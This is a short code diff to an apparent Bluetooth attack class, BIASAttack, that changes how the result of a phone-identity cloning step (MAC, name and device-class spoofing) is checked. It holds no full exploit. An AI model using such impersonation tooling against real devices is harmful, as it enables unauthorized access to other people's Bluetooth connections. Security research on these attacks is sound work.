@@ -244,10 +244,11 @@ class BIASAttack:
         with phase("BIAS Role-Switch Attack"):
             # Step 1: Clone phone identity
             with step(f"Cloning {target(self.phone_address)} identity"):
-                if not clone_device_identity(
+                clone_result = clone_device_identity(
                     self.hci, self.phone_address,
                     self.phone_name or "Phone", "0x5a020c",
-                ):
+                )
+                if not clone_result.get("success", False):
                     error("Identity clone failed")
                     results["notes"].append("Failed to spoof MAC/name")
                     self._executions.append(make_execution(
@@ -432,8 +433,9 @@ class BIASAttack:
 
             # Phase 1: Clone phone identity
             info(f"[BIAS] Step 2: Cloning identity {self.phone_address}")
-            if not clone_device_identity(self.hci, self.phone_address,
-                                          self.phone_name, "0x5a020c"):
+            clone_result = clone_device_identity(self.hci, self.phone_address,
+                                                   self.phone_name, "0x5a020c")
+            if not clone_result.get("success", False):
                 error("[BIAS] Identity cloning failed")
                 result["details"].append("Identity cloning failed")
                 self._executions.append(make_execution(
